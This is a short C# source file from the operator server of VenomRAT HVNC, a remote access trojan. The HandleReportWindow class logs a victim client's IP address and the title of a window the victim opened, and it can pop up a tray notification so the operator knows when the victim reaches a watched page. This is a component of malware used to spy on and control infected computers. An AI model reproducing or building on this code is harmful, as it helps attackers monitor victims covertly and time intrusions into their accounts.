using System.Drawing;
using Server;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    public class HandleReportWindow
    {
        public HandleReportWindow(Clients client, string title)
        {
            new HandleLogs().Addmsg(string.Concat(new string[] { "Client ", client.Ip, " opened [", title, "]" }), Color.Blue);
            if (global::VenomRAT_HVNC.Server.Properties.Settings.Default.Notification)
            {
                Program.form1.notifyIcon1.BalloonTipText = string.Concat(new string[] { "Client ", client.Ip, " opened [", title, "]" });
                Program.form1.notifyIcon1.ShowBalloonTip(100);
            }
        }
    }
}
